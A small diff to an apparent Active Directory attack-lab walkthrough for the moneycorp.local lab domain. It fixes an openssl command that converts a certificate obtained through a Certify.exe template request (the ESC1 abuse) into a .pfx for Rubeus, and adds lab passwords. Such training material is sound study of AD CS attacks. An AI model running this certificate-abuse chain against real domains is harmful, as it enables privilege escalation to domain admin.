@@ -913,9 +913,14 @@ Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template
 ![](https://i.imgur.com/niHO6bN.png)
 
 
-- Run the below command
+- Run the below command to convert `esc1.pem` to a `.pfx` file so our tool `rubeus` will understand this format
 
 
 ```powershell
-C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem-keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
 ```
+
+
+> If you are asked for a password in the lab, use **secretpassword123** or **secretpass**
+
+
